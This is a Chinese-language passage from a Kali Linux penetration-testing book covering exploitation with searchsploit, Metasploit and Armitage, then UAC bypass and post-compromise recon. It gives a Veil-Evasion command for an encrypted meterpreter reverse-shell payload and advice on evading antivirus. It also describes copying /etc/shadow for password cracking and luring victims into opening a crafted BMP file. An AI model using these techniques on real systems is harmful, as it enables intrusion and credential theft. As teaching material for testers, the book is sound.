  \n\n\n\n![](img/index-110_219.png)\n\n# 漏洞利用 (Exploit)\n\n渗透测试人员和攻击者必须找到特定的漏洞来利用已知和怀疑的漏洞。搜索的起点是供应商网站；大多数硬件和应用程序供应商在发布补丁时会发布有关漏洞的信息。如果已知某个漏洞，大多数供应商都会向客户强调此点。尽管他们的意图是让客户能够测试该漏洞的存在，但攻击者也会利用这些信息。\n\
  \n其他收集、分析并共享漏洞信息的在线网站如下：\n\n- [国家漏洞数据库 (National Vulnerability Database)](http://www.nvd.nist.gov/vuln/search)\n\
  - [Secunia](http://secunia.com/community/)\n- [开源漏洞数据库项目 (Open Source Vulnerability\
  \ Database - OSVDB)](http://www.osvdb.org/search/adv)\n- [Packetstorm security (Packetstorm\
  \ security)](http://packetstormsecurity.com/)\n- [SecurityFocus](http://www.securityfocus.com/)\n\
  - [Exploit-DB](http://1337day.com/)\n- [由 Offensive Security 维护的漏洞利用数据库 (Exploit\
  \ Database maintained by Offensive Security)](http://www.db-exploit.com)\n\n漏洞利用数据库也被复制到了\
  \ Kali 中，可以在 `/usr/share/exploitdb` 目录找到。在使用之前，确保使用以下命令对其进行更新：\n\n```bash\ncd /usr/share/exploitdb\n\
  wget http://www.exploit-db.com/archive.tar.bz2\ntar -xvjf archive.tar.bz2\n```\n\
  \n要搜索 `exploitdb` 的本地副本，打开终端窗口并在提示符中输入 `searchsploit` 和所需的搜索词。这将调用包含所有漏洞列表的数据库文件\
  \ (`.csv`)。搜索将返回已知漏洞的描述以及相关漏洞的路径。漏洞可以被提取、编译并针对特定的漏洞运行。查看下面的截图，它显示了漏洞的描述：\n\n**[\
  \ 94 ]**\n\n## 第 4 章\n\n![](img/index-112_1.png)\n\n脚本从左到右扫描 `CSV` 文件中的每一行，因此搜索词的顺序很重要——搜索\
  \ `oracle10g` 会返回多个漏洞，但搜索 `10g oracle` 不返回任何结果。此外，脚本对大小写敏感；尽管指示在搜索词中使用小写字母，但搜索 `Bulletproof\
  \ FTP` 没有命中，而 `bulletproof FTP` 返回了七个命中，且 `bulletproof ftp` 则没有命中。更有效的 `CSV` 文件搜索可以使用\
  \ `grep` 命令或搜索工具如 `KWrite` (`apt-get install kwrite`)。\n\n对本地数据库的搜索可能会识别出几个带有描述和路径的可能漏洞；然而，这些必须根据你的环境进行自定义，并在使用之前编译。将漏洞复制到\
  \ `/tmp` 目录（给定的路径 `/windows/remote` 位于 `/platforms` 目录）。\n\n以 Perl、Ruby 和 PHP 等脚本形式呈现漏洞相对容易实现。例如，如果目标是可能受到\
  \ WebDAV 身份验证绕过影响的 Microsoft 6.0 服务器，将漏洞复制到根目录并作为标准的 Perl 脚本执行，如下截图所示：\n\n![](img/index-112_2.png)\n\
  \n**[ 95 ]**\n\n# 漏洞利用 (Exploit)\n\n许多漏洞以源代码的形式提供，在使用前必须进行编译。例如，针对 RPC 特定漏洞的搜索识别出了几个可能的漏洞。下面的截图显示了片段：\n\
  \n![](img/index-113_1.png)\n\n标识为 `76.c` 的 `RPC-DCOM` 漏洞在实践中是相当稳定的。因此，我们将它作为一个示例。要编译此漏洞，将其从存储目录复制到\
  \ `/tmp` 目录。在该位置，使用以下命令通过 `GCC` 进行编译：\n\n```bash\nroot@kali:~# gcc 76.c -o 76.exe\n\
  ```\n\n这将使用 GNU 编译器集（Compiler Collection）应用程序将 `76.c` 编译为输出名称 (`-o`) 为 `76.exe`\
  \ 的文件，如下截图所示：\n\n![](img/index-113_2.png)\n\n针对目标调用应用程序时，必须使用符号链接调用可执行文件（它未存储在 `/tmp`\
  \ 目录）：\n\n```bash\nroot@kali:~# ./76.exe\n```\n\n该漏洞的源代码文档完备，且执行时所需的参数非常清晰，如下截图所示：\n\
  \n**[ 96 ]**\n\n## 第 4 章\n\n![](img/index-114_1.png)\n\n遗憾的是，并不是所有来自漏洞数据库和其他公共来源的漏洞都能像\
  \ `76.c` 那样容易编译。对于渗透测试人员来说，有几个问题使得此类漏洞的使用变得麻烦甚至危险，如下：\n\n- 经常会遇到故意的错误或不完整的源代码，因为经验丰富的开发者试图让漏洞远离缺乏经验的用户，特别是那些在不知道其行为伴随的风险的情况下尝试破坏系统的初学者。\n\
  - 漏洞并不总是有充分的文档说明；毕竟，没有标准来规定用于破坏数据系统的代码创建和使用。因此，它们可能很难使用，特别是对于缺乏专业知识的测试人员。\n- 由于环境变化（应用到目标系统的新补丁和目标的语言差异）导致的行为不一致，可能需要对源代码进行重大修改。\n\
  - 始终存在免费代码包含恶意功能的风险。渗透测试人员可能认为他正在进行概念证明 (`POC`) 实验，而不知道该漏洞已经在程序中创建了后门。\n\n为了确保结果的一致性并创建一个遵循一致实践的代码社区，开发了多种漏洞利用框架。最流行的利用框架是\
  \ Metasploit Framework。\n\n**[ 97 ]**\n\n# 漏洞利用 (Exploit)\n\n## Metasploit Framework\n\
  \n`MSF` 是一种用于辅助渗透测试的开源工具。它用 Ruby 语言编写，采用模块化方法来辅助漏洞。这使得开发和编写漏洞变得更容易，同时也允许实现复杂的攻击。\n\
  \nMSF 可以为控制利用后端模块提供多个界面（控制台、CLI 和 Web）。我们将使用控制台界面，因为它展示了攻击命令，并以易懂的方式提供所需的配置参数。要访问此界面，在提示符中输入\
  \ `msfconsole` 或从“安全工具前 10”等下拉菜单中选择。下面的截图显示了应用程序启动时的启动界面：\n\n![](img/index-115_1.png)\n\
  \nMSF 由组合以影响漏洞的模块组成：\n\n- **漏洞 (Exploits)**：针对特定漏洞的代码片段。主动漏洞将利用特定目标（例如缓冲区溢出）。被动漏洞等待接入的主机（例如\
  \ 浏览器或 FTP 客户端），并在它们连接时进行利用。\n- **有效负载 (Payloads)**：这些是在成功利用后立即执行命令的恶意代码。\n- **辅助模块\
  \ (Auxiliary modules)**：这些模块不建立或直接支持（漏洞会话）。\n\n\n\n\n\n测试者与目标系统之间的访问；相反，他们执行扫描、模糊测试或嗅探等相关功能，这些功能支持漏洞利用阶段。\n\
  \n- **后渗透模块 (Post modules)**：在攻击成功后，这些模块在被攻破的目标上运行，以收集有用数据并引导攻击者进一步渗透到目标网络。我们将在*第\
  \ 5 章**后渗透——目标执行*中学习更多关于后渗透模块的知识。\n- **编码器 (Encoders)**：当利用程序必须绕过杀病毒软件防护时，这些模块会对负载（payload）进行编码，使其无法通过特征匹配技术被检测。\n\
  - **无操作 (`NOPs`)**：这些用于在攻击过程中促进缓冲区溢出。\n\n这些模块被组合使用以对目标进行侦察并发起攻击。使用 MSF 利用目标系统的步骤可以总结如下：\n\
  \n1. 选择并配置利用程序（exploit，利用目标系统上特定漏洞的代码）。\n2. 检查目标系统以确定其是否易受该利用程序的攻击。此步骤是可选的，通常会被省略以最小化检测的概率。\n\
  3. 选择并配置负载（payload，在成功利用后将在目标系统上执行的代码。例如，从被攻破系统返回到源的反向 shell）。\n4. 选择一种编码技术以绕过检测控制（IDS/IPS\
  \ 或杀病毒软件）。\n5. 执行利用程序。\n\n下一个示例代表了针对目标 Linux 操作系统 Metasploitable2 的简单攻击。它可以在 `http://sourceforge.net/projects/metasploitable/files/Metasploitable2`\
  \ 在线获取。Metasploitable2 的设计就是为了易受攻击，它包含了已知且有特征的漏洞，为训练和验证利用工具提供了一个标准平台。\n\n**[ 99\
  \ ]**\n\n*利用程序 (Exploit)*\n\n当以虚拟机形式安装时（见*附录**安装 Kali Linux*），可以使用 `nmap` 对 Metasploitable\
  \ 进行扫描，它会识别开放的端口和相关的应用程序。接下来的截图显示了 `nmap` 扫描的一个片段：\n\n![](img/index-117_1.png)\n\
  \n在上一个示例中，`nmap` 识别出了几个应用程序。作为测试者，我们应该调查每一个程序是否存在已知漏洞。开始调查的几个地方之一是 Metasploit 自己的利用程序集合。可以使用以下命令行进行搜索：\n\
  \n```\nmsf> search samba\n```\n\n返回的 `samba` 服务的利用程序被列出，每个利用程序都分配分配了一个相对排名，说明其实现利用的成功程度。接下来的截图显示了可用\
  \ samba 利用程序的片段：\n\n![](img/index-117_2.png)\n\n**[ 100 ]**\n\n## 第 4 章\n\n`exploit/multi/samba/usermap_script`\
  \ 利用程序被选择在本示例的剩余部分中使用，因为它被评为优秀。该排名由 Metasploit 开发团队确定的，它识别了熟练测试者针对稳定目标系统时，该利用程序工作的可靠性。在现实生活中，多个变量（测试者的技能、网络上的防护设备以及对操作系统和托管应用程序的修改）可能会共同作用，显著改变利用程序的可靠性。\n\
  \n使用以下 `info` 命令获取了关于该利用程序的额外信息：\n\n```\nmsf> info exploit/multi/samba/usermap_script\n\
  ```\n\n返回的信息包括引用以及接下来的截图所示的信息：\n\n![](img/index-118_1.png)\n\n**[ 101 ]**\n\n*利用程序\
  \ (Exploit)*\n\n为了指示 Metasploit 我们将此利用程序攻击目标，我们发布以下命令：\n\n```\nmsf> use exploit/multi/samba/usermap_script\n\
  ```\n\nMetasploit 将命令提示符从 `msf>` 更改为 `msf exploit (usermap_script) >`。\n\nMetasploit\
  \ 提示测试者选择负载（从被攻破系统返回攻击者的反向 shell），并按如下列表设置其他变量：\n\n- **远程主机 (RHOST)**：目标系统的 IP 地址。\n\
  - **远程端口 (RPORT)**：攻击使用的端口号。\n- **本地主机 (LHOST)**：测试者系统的 地址 地址。\n\n执行利用程序。Metasploit\
  \ 提示符 `msf exploit (multi/samba/usermap_script) >` 提示测试者选择负载（从被攻破系统返回到攻击者的反向 shell）。\n\
  \n要验证 shell 是否存在，测试者可以执行 `uname -a` 和 `whoami` 来确认结果。接下来的截图所示：\n\n![](img/index-119_1.png)\n\
  \n**[ 102 ]**\n\n## 第 4 章\n\n当系统被攻破到这种程度时，已准备进行后渗透活动（见*第 5 章**后渗透——目标执行*和*第 6 章**持久化*）。向\
  \ Metasploit 添加新的利用程序，可以使用 Ruby 脚本 (`.rb`) 或 Python 脚本 (`.py`) 将它们放在 `.msf4` 目录下，然后重新加载\
  \ `msfconsole`。\n\n### 利用应用程序\n\nMetasploit 框架对于操作系统以及第三方应用程序的漏洞同样有效。在示例中，我们将利用在\
  \ Chasys Draw IES（版本 4.1）中识别出的漏洞。漏洞存在于 `ReadFile` 函数中，该函数以不安全的方式存储用户提供的数据。利用将在用户上下文中执行任意代码。\n\
  \n为了启动攻击，测试者需要生成一个特制的 BMP 文件，然后让受害者打开它。这适用于 Windows XP SP3 和 Windows 7 SP1。第一步是打开\
  \ `msfconsole` 并设置 Metasploit 使用 `exploit/windows/fileformat/chasys_draw_ies_bof`，如下所示：\n\
  \n![](img/index-120_1.png)\n\n再次，该利用程序是一个相对简单的利用程序。它要求测试者设置从被攻破系统返回到测试者系统的反向 shell\
  \ (`reverse_tcp`)。\n\n当利用程序完成后，它会创建一个特制的 BMP 文件，该文件的默认名称为 `msf.bmp`。为了诱导目标打开文件并避免被某些设备检测到默认名称，最好将文件名更改为与目标相关的名称。\n\
  \n\n\n\n\n## 使用 Armitage 利用多个目标\n\n渗透测试人员经常会忽略 Armitage，因为他们更倾向于使用 Metasploit 控制台传统的命令行输入，而不是其\
  \ GUI 界面。然而，它在拥有 Metasploit 功能的同时，提供了其许多可能选项的可视性，使其成为复杂测试环境中的良好替代方案。与 Metasploit\
  \ 不同，它还允许你同时测试多个目标——一次多达 512 个目标。\n\n要启动 Armitage，请确保使用以下命令启动了数据库和 Metasploit 服务：\n\
  \n```\nservice postgresql start\nservice metasploit start\n```\n\n完成该步骤后，在命令提示符中输入\
  \ `armitage` 执行该命令。Armitage 的执行并不总是顺畅的，可能需要重复启动步骤以确保其运行正常。\n\n要发现可用目标，你可以通过提供 IP\
  \ 地址手动添加主机，或者从菜单栏的 `Hosts` 标签页选择 `nmap` 扫描。Armitage 还可以使用 `MSF` 辅助命令或 DNS 枚举来枚举目标。\n\
  \nArmitage 还可以从以下文件导入主机数据：Acunetix, amap, AppScan, Burp proxy, Foundstone, Microsoft\
  \ Baseline Security Analyzer, Nessus NBE 和 XML 文件, NetSparker, NeXpose, nmap, OpenVas,\
  \ Qualys 以及 Retina。Armitage 的初始启动界面如下所示：\n\n![](img/index-122_1.png)\n\n[ 105 ]\n\
  \n### 漏洞利用\n\nArmitage 允许你通过右键点击主机，然后进入 `Host` 菜单并选择 `Set Label…` 功能来设置主机标签。这允许你标记特定地址或通过通用名称进行标识，这在使用基于团队的测试时非常有帮助。该过程如截图所示：\n\
  \n![](img/index-123_1.jpg)\n\nArmitage 还支持动态工作空间——一种根据网络标准、操作系统、开放端口和服务以及标签对网络进行的过滤视图。例如，你可能测试一个网络并识别出几个几个补丁程度似乎不如网络其他部分的服务器。可以通过给它们分配标签然后将它们放置在优先级工作空间中来突出显示它们。\n\
  \n一旦你识别了网络上存在的目标系统，就可以选择特定的模块作为漏洞利用过程的一部分。你还可以使用菜单栏中的 `Attacks` 选项来查找攻击方法。\n\n要利用主机，右键点击它，导航到\
  \ `Attack` 项并选择一个漏洞利用（确保已为该主机设置了正确的操作系统；这并不总是自动发生的）。\n\n一个有趣的选项是位于 `Attacks` 选项下的\
  \ `Hail Mary`。通过选择此功能，所有识别出的系统将自动受到漏洞利用，以实现最大数量的可能破解。这是一种噪声非常大的攻击，因此应被作为最后的测试选择。它也是判断入侵检测系统是否正确实施和配置的极佳方法！\n\
  \n[ 106 ]\n\n## 第 4 章\n\n被攻破的系统会显示为一个带有红色边框和电火花的图标。在下一张截图中，两个测试系统已被攻破，且这些系统与测试人员之间存在四个活跃会话。`Active\
  \ Sessions` 面板指示连接情况并识别使用了什么漏洞来攻破目标。查看以下代表不同选项的截图：\n\n![](img/index-124_1.png)\n\
  \n在进行的一次渗透测试中，`Hail Mary` 选项识别了目标两个可利用的漏洞并启动了两个活跃会话。对同一目标进行手动测试最终识别出八个可利用的漏洞，并在被攻破系统与测试人员之间建立了多个通信通道。此类真实世界的测试强化了自动化工具在渗透测试过程中的优和缺点。\n\
  \n## 使用 Armitage 进行团队测试\n\nArmitage 不仅仅是 Metasploit Framework 的 GUI 前端；它还是一个可脚本的渗透测试工具，允许团队使用\
  \ Metasploit Framework 的单实例，使 GUI 显示以下功能：\n\n- 它使用相同的会话，允许一名测试人员监督整个过程，识别感兴趣的发现，并控制测试方向。\n\
  - 它运行脚本来自动化测试任务。\n\n[ 107 ]\n\n### 漏洞利用\n\n- 它共享下载的文件，例如密码文件。这允许一个团队成员专注于密码破解，而其他团队成员继续漏洞利用阶段。\n\
  - 它使用共享的事件日志进行通信。\n\n要利用团队配置的优势，请确保 Armitage 未在运行，然后从 Armitage 目录（通常为 `/usr/share/armitage`）的控制提示符中调用\
  \ `teamserver` 脚本，如下：\n\n```\nroot@kali:/usr/share/armitage# ./teamserverip_address\
  \ password\n```\n\n确保 IP 地址是正确的，因为 Armitage 不会验证该地址，并确保所有团队成员都能通过端口`55553`访问主机。当你启动\
  \ Armitage 团队服务器时，它使用 SSL 证书与团队成员通信；团队成员应验证证书的 SHA-1 哈希值与服务器的 SSL 证书匹配。\n\n当 teamserver\
  \ 脚本运行时，不要连接到 `127.0.0.1`，因为 Armitage 使用该 IP 地址进行连接并判断应使用 SSL（teamserver 或远程地址）还是非\
  \ SSL（`localhost` 或 `msfrpcd`）。要在本地将 Armitage 连接到团队服务器，请在 `Host` 字段中使用外部 IP 地址。\n\
  \n用户可以打开一个或多个命令 shell、浏览文件、下载数据并截图。shell 会话进入后会自动锁定，随后解锁。然而，某些 meterpreter 脚本可能会随着时间的推移而失败。\n\
  \n为了通信，菜单中的 `View` 选项打开共享事件日志。你可以像使用 IRC 或聊天室一样向日志输入条目，日志会记录所有注释。\n\n## 编写 Armitageget\n\
  \nArmitage 包含了 `Cortana` 脚本语言，它基于 `Sleep`，这是一种类似于 Perl 的扩展语言。Cortana 脚本可以定义快捷键、插入菜单并创建用户界面。\n\
  \n脚本可以作为独立实体运行（这需要团队处于激活状态）或直接从 Armitage 运行。要加载现有脚本，选择主菜单栏中的 `Armitage`，然后选择 `Scripts`。将打开一个标签视图，并提供加载脚本的选项。\n\
  \nArmitage 还提供了脚本环境，可以通过菜单的 `View | Script Console` 标签调用，如下所示：\n\n[ 108 ]\n\n##\
  \ 第 4 章\n\n(所示)\n\n一个使用 Metasploit Framework 完全扫描目标系统的示例脚本可以写为 `scanner.cna`。每当添加新主机时（`host_add`），MSF\
  \ 端口扫描器将扫描定义的 TCP 端口列表和可用 UDP 端口。查看以下代码片段，它显示了扫描器脚本：\n\n```ruby\n# MSF port scanner\n\
  onhost_add {\n  println(\"[*] MSF Port Scanner New Host OpenPorts on$1\");\n  $console\
  \ = console();\n  cmd($console, \"use auxiliary/scanner/portscan/tcp\");\n  cmd($console,\
  \ \"set THREADS 12\");\n  cmd($console, \"set PORTS 139,143\");\n  # enter other\
  \ ports as required\n  cmd($console, \"set RHOSTS $1\");\n  cmd($console, \"run\
  \ -j\");\n  cmd($console, \"use auxiliary/scanner/discovery/udp_sweep\");\n  cmd($console,\
  \ \"set THREADS 12\");\n  cmd($console, \"set BATCHSIZE 256\");\n  cmd($console,\
  \ \"set RHOSTS $1\");\n  cmd($console, \"run -j\");\n\n  db_sync();\n\n}\n```\n\n\
  \n\n\n由于 Cortana 与 Metasploit Framework 有深度钩子（hooks），可以使用脚本来自动启动漏洞利用、执行后渗透活动（例如跟踪用户活动），并促进攻击者攻击链中的多用户活动。\n\
  \n# [ 109 ]\n\n### 漏洞利用\n\n## 绕过 ID 和反病毒检测\n攻击链中的漏洞利用阶段对于渗透测试人员或攻击者来说是最危险的阶段——他们直接与目标网络或系统交互，其活动极有可能被记录或身份被发现。同样，必须采用隐身手段来最大限度地降低测试人员的风险。虽然没有任何特定的方法或工具是不可检测的，但某些配置更改和特定工具会增加检测的难度。\n\
  \n在考虑远程漏洞时，大多数网络和系统采用各种类型的防御措施来最大限度地降低攻击风险。网络设备包括路由器、防火墙、入侵检测和防御系统以及恶意软件检测软件。\n\n\
  为了便于利用，大多数框架都集成了使攻击具有某种隐蔽性的功能。Metasploit Framework 允许你针对每个漏洞手动设置规避因素；然而，确定哪些因素（如加密、端口号、文件名等）可以规避可能是困难的，并且会随每个特定的\
  \ ID 而变化。Metasploit Framework 还允许目标与攻击系统之间的通信进行加密（使用 `windows/meterpreter/reverse_tcp_rc4`\
  \ 负载），使得漏洞载荷难以被检测。\n\nMetasploit Pro 在 Kali 发行版中提供试用，包含以下专门用于绕过入侵检测系统的功能：\n\n* \
  \  可以在 `Discovery Scan` 的设置中调整扫描速度，通过将速度设置为 `sneaky` 或 `paranoid` 来降低与目标的交互速度。\n\
  *   通过发送较小的 TCP 数据包并增加数据包之间的传输时间来实现传输层规避。\n*   减少针对目标系统启动的并发漏洞利用程序数量。\n*   可以为涉及\
  \ DCERPC、HTTP 和 SMB 的漏洞利用自动设置针对特定应用程序的规避选项。\n\n大多数反病毒软件依赖签名匹配来定位病毒和其他恶意软件。它们会检查每个可执行文件，寻找已知存在于病毒中的代码字符串（签名），并在检测到可疑字符串时触发警报。Metasploit\
  \ 的许多攻击依赖于文件，这些文件可能具有随着时间推移已被反病毒厂商识别出的签名。\n\n针对此此，Metasploit Framework 允许对独立可执行文件进行编码以绕过检测。遗憾的是，在\
  \ `virustotal.com` 等公共网站对这些可执行文件进行的大量测试降低了它们绕过 AV 软件的效果。\n\n# [ 110 ]\n\n## 第 4\
  \ 章\n\n一个由 Chris Truncer 编写的新 AV 规避框架 `Veil-Evasion`（`www.Veil-Evasion.com`）现在为针对独立漏洞的检测提供了有效保护。Veil-Evasion\
  \ 提供了以下功能：\n\n*   它允许在设置中调整扫描速度，降低与目标的交互速度。\n*   它通过发送较小的 TCP 数据包并增加数据包之间的传输时间来实现传输层规避。\n\
  *   它减少了针对目标系统启动的并发漏洞利用数量。\n*   它为涉及 DCERPC、HTTP 和 SMB 的漏洞利用提供了特定应用程序的规避选项。\n\n\
  Veil-Evasion 提供了若干特性：\n\n*   它允许对独立可执行文件进行编码以绕过检测。\n*   它支持包括 C# 和 Python 在内的多种编程语言。\n\
  *   它可以集成自定义 shellcode 和加密方法。\n*   它提供了一个部署载荷（payload）的框架。\n*   它允许使用 AES 等不同的加密技术。\n\
  \n\n\n随后用户将看到输出菜单，并提示其为生成的 payload 文件选择基本名称。如果 payload 是基于 Python 的，且你选择了 `compile_to_exe`\
  \ 作为选项，用户可以选择使用 `Pyinstaller` 创建 EXE 文件，或者生成 `Py2Exe` 文件，如下截图所示：\n\n![](img/index-133_1.png)\n\
  \n最后一个屏幕显示了生成的 payload 的信息，如下截图所示：\n\n![](img/index-133_2.png)\n\n也可以直接通过命令行使用以下选项创建漏洞利用程序：\n\
  \n```\nkali@linux:~./Veil-Evasion.py -p python/shellcode_inject -aes_encrypt -o\
  \ -output --msfpayload windows/meterpreter reverse_tcp --msfoptions LHOST=192.168.43.134\
  \ LPORT=4444\n```\n\n[116]\n\n# 第 4 章\n\n一旦创建了漏洞利用，测试人员应该在 VirusTotal 上验证 payload，以确保其在放置于目标系统时不会触发警报。如果直接将\
  \ payload 样本提交到 VirusTotal 且其行为被标记为恶意软件，那么杀毒软件（`AV`）厂商可能在一小时内发布针对该提交的签名更新。这就是为什么用户被明确警告“不要将样本提交给任何在线扫描器！”\n\
  \nVeil-Evasion 允许测试人员对 VirusTotal 进行安全检查。当创建任何 payload 时，都会生成一个 SHA1 哈希值并将其添加到 `~/veil-output`\
  \ 目录下的 `hashes.txt` 中。测试人员可以调用 `checkvt` 脚本将哈希提交到 VirusTotal，它将根据恶意软件数据库比对 SHA1\
  \ 哈希值。如果 Veil-Evasion payload 触发了匹配，测试人员就知道它可能被目标系统检测。如果没有触发匹配，则漏洞利用 payload 将绕过杀毒软件。使用\
  \ `checkvt` 命令进行成功查询（AV 无法检测）的结果所示：\n\n![](img/index-134_1.png)\n\n目前为止的测试支持了这一发现：如果\
  \ `checkvt` 在 VirusTotal 上未找到匹配，则 payload 将不会被目标的杀毒软件检测。若要在 Metasploit Framework\
  \ 中使用，请使用 `exploit/multi/handler`并将 `PAYLOAD` 设置为 `windows/meterpreter/reverse_tcp`（与\
  \ Veil-Evasion payload 选项相同），并使用与 Veil-Evasion 相同的 `LHOST` 和 `LPORT`。当监听器运行后，将漏洞利用发送到目标系统。当监听器启动时，它将建立一个返回攻击者系统的反向\
  \ shell。\n\n[117]\n\n## 漏洞利用 (Exploit)\n\n### 摘要\n在本章中，我们重点关注漏洞利用，作为一种将侦察发现转化为定义行动，从而在测试人员与目标之间建立访问的工具。\n\
  \nKali 提供了多种工具来辅助漏洞利用的开发、选择和激活，包括内部的 `exploit-db` 数据库以及几个简化漏洞利用使用和管理的框架。在这些框架中，Metasploit\
  \ Framework 和 Armitage 特别重要；然而，Veil-Evasion 通过其绕过杀毒检测的能力增强了这两者。\n\n接下来的两章将关注攻击者杀链中最重要的部分——后利用活动。这是攻击者实现目标的部分。典型的后利用活动包括窃取和外泄数据（所有权或财务信息）、利用不佳的访问控制进行水平提升，以及通过窃取用户凭据进行垂直提升。\n\
  \n[118]\n\n# 后利用 – 目标行动 (Action on the Objective)\n\n在现代黑客和系统攻击世界中，攻击者对利用本身的关注往往不如对获得访问权限后能做什么。这是杀链中攻击者实现攻击全部价值的部分。\n\
  \n一旦系统被攻破，攻击者通常执行以下活动：\n\n- 进行快速评估以刻画本地环境（基础设施、连接性、账户、目标文件的存在以及可以促进进一步攻击的应用程序）\n\
  - 定位并复制或修改感兴趣的目标文件，例如数据文件（所有权数据和财务信息）\n- 创建额外账户并修改系统以支持后利用活动\n- 尝试通过捕获管理员或系统级凭据来垂直提升用于访问的权限级别\n\
  - 尝试通过被攻破的系统中转到网络的其余部分来攻击其他数据系统（水平提升）\n- 安装持久化后门和隐蔽通道以保留控制并与被攻破的系统进行安全通信（这将在`第 6\
  \ 章，后利用 – 持久化`中涵盖）\n- 从被攻破的系统中移除攻击痕迹\n\n要成功，后利用活动需要对目标操作系统和文件结构有全面的了解，以确保可以绕过保护控制。后利用的第一步是在本地网络环境下对被攻破的系统进行侦察。\n\
  \n### 后利用 – 目标行动\n\n在本章中，你将学习：\n\n- 如何绕过 Windows 用户账户控制 (`UAC`)\n- 如何对被攻破的系统进行快速侦察\n\
  - 如何从被攻破的系统中获取敏感数据（掠夺）\n- 如何创建额外账户\n- 如何使用 Metasploit Framework 进行后利用活动\n- 提高访问权限和增加破解账户数量的垂直和水平提升技术\n\
  - 如何使用反取证技术掩盖踪迹并防止破解被发现\n\n## 绕过 Windows 用户账户控制 (UAC)\n\n在 Windows Vista 及更高版本中，微软引入了安全控制限制进程在三个不同的完整性级别：高、中、低。高完整性进程具有管理员权限，中级进程以标准用户权限运行，低完整性进程受到限制，以确保被破解时损害最小。\n\
  \n为了执行任何特权操作，程序必须以管理员身份运行并符合 UAC 设置。四个 UAC 设置如下：\n\n- **始终通知**：这是最严格的设置，当任何程序想要使用更高权限时，都会向本地用户发出提示。\n\
  - **仅在程序尝试更改我的电脑时通知**：这是默认 UAC 设置。当原生 Windows 程序请求更高级别的权限时，不会提示用户。然而，如果第三方程序想要提升权限，则会提示。\n\
  - **仅在程序尝试更改我的电脑时通知（不调暗桌面）**：这与默认设置相同，但在提示用户时不会调暗显示器。\n- **从不**：此选项将系统恢复到 Vista\
  \ 之前的时代。如果用户是管理员，所有程序将以高完整性运行。\n\n[120]\n\n# 第 5 章\n\n因此，在利用后，测试人员（和攻击者）想要知道以下两点：\n\
  \n- 系统识别出的用户是谁？\n- 他们在系统中拥有什么权限？\n\n可以使用以下命令进行确定：\n\n```\nC:\\> whoami /groups\n\
  ```\n\n被攻破的系统在高完整性上下文中运行，如下截图中的 `Mandatory Label\\High Mandatory Level Label` 所示：\n\
  \n![](img/index-138_1.jpg)\n\n如果标签为 `Mandatory\\Medium Mandatory Level`，测试人员需要从标准用户权限提升到管理员权限，以便许多后利用步骤能够成功。\n\
  \n\n\n\n\n提升权限的第一种方案是运行 Metasploit 中的 `exploit/windows/local/ask`，它会启动 `RunAs` 攻击。这将创建一个可执行文件，调用时它将运行一个程序以请求提升权限。创建该可执行文件应使用\
  \ `EXE::Custom` 选项，或使用 `Veil-Evasion` 进行加密以避免被本地杀毒软件的检测。\n\n`RunAs` 攻击的缺点是用户会收到提示，显示有一个来自未知发布者的程序想要对计算机进行更改。此警告可能会导致权限提升被识别为攻击。\n\
  \n### 121\n\n### 漏洞利用后 – 目标行动\n\n如果系统的当前用户处于管理员组中，并且如果 UAC（用户账户控制）被设置为默认的`仅当程序尝试更改我的计算机时通知我`（如果设置为`始终通知`则将不起作用），攻击者将能够使用\
  \ Metasploit 的 `exploit/windows/local/bypassuac` 模块来提升其权限。\n\n`bypassuac` 会在目标系统上创建多个伪制品，并可能被大多数杀毒软件识别。然而，`exploit/windows/local/bypassuac_inject`\
  \ 模块将可执行文件直接放入运行在内存中的反射 DLL 中，不触碰硬盘，从而最大限度地减少了杀毒软件检测的机会。\n\n尝试绕过 UAC 控制时的一些注意事项如下：\n\
  \n- 绕过 UAC 的攻击对 Windows Vista 无效，因为该系统需要用户确认并确认每一次特权访问。\n- Windows 8 仍然容易受到此类攻击的影响。然而，Metasploit\
  \ Framework 攻击目前在 Windows 8.1 上无效。如果尝试进行，用户在攻击获得提升权限之前将被要求点击 OK 按钮——这几乎不是一种隐蔽的攻击。攻击者可以通过选择使用\
  \ `exploit/windows/local/ask` 来修改攻击，从而提高成功几率。\n- 在考虑系统间的移动（水平/横向提升）时，如果当前用户是在在其他系统上具有本地管理员权限的域用户，可以使用现有的身份令牌获取访问并绕过\
  \ UAC。实现此目的的常用攻击是 Metasploit 的 `exploit/windows/local/current_user_psexec`。\n\n\
  ### 对被攻破系统进行快速侦察\n\n一旦系统被攻破，攻击者就需要获取有关该系统的关键信息、其网络环境、用户和用户账户。通常，他们会从 shell 提示符输入一系列命令或运行调用这些命令的脚本。\n\
  \n### 122\n\n### 第 5 章\n\n如果被攻破的系统基于 Unix 平台，典型的本地侦察命令将包括以下内容：\n\n| 命令 | 说明 |\n\
  | :--- | :--- |\n| `/etc/resolv.conf` | 使用 `copy` 命令访问并查看系统的 DNS 设置。由于它是一个具有读取权限的全局文件，访问它时不会触发报警。\
  \ |\n| `/etc/passwd` 和 `/etc/shadow` | 这些是包含用户名和密码哈希的系统文件。具有 root 级权限的人员可以复制它们，并可以使用\
  \ `John the Ripper` 等工具破解密码。 |\n| `whoami` 和 `who -a` | 识别本地系统上的用户。 |\n| `ifconfig\
  \ -a`, `iptables -L -n` | 提供网络信息。`ifconfig -a` 和 `netstat -r` 提供 IP 详情，`iptables\
  \ -L -n` 列出本地防火墙（如果存在）中保留的所有规则，`netstat -r` 显示内核维护的路由信息。 |\n| `uname -a` | 打印内核版本。\
  \ |\n| `ps aux` | 打印当前运行的服务、进程 ID 和其他信息。 |\n| `dpkg -l`, `yum list | grep` | 识别已安装的软件包。\
  \ |\n| `rpm -qa --last | head` | `dpkg -l` 和 `rpm -qa --last | head` |\n\n这些命令包含了可用选项的简要摘要。请参考相应命令的帮助文件以获取有关如何使用的完整信息。\n\
  \n对于 Windows 系统，将输入以下命令：\n\n| 命令 | 说明 |\n| :--- | :--- |\n| `whoami /all` | 列出当前用户、SID、用户权限和组。\
  \ |\n\n### 123\n\n### 漏洞利用后 – 目标行动\n\n| 命令 | 说明 |\n| :--- | :--- |\n| `ipconfig\
  \ /all` 和 `ipconfig /displaydns` | 显示有关网络接口、连接性协议和本地 DNS 缓存的信息。 |\n| `netstat -bnao`\
  \ | 列出端口和连接，以及相应的 `netstat -r` 进程 (`-b`)、不查找 (`-n`)、所有连接 (`-a`) 和父进程 ID (`-o`)。`-r`\
  \ 选项显示路由表。运行它们需要管理员权限。 |\n| `net view` | 查询 NBNS/SMB 以定位当前 `net view /domain` 工作组或域中的所有主机。通过\
  \ `/domain` 给该主机可用的所有域。 |\n| `net user /domain` | 列出定义域中的所有用户。 |\n| `net user %username%\
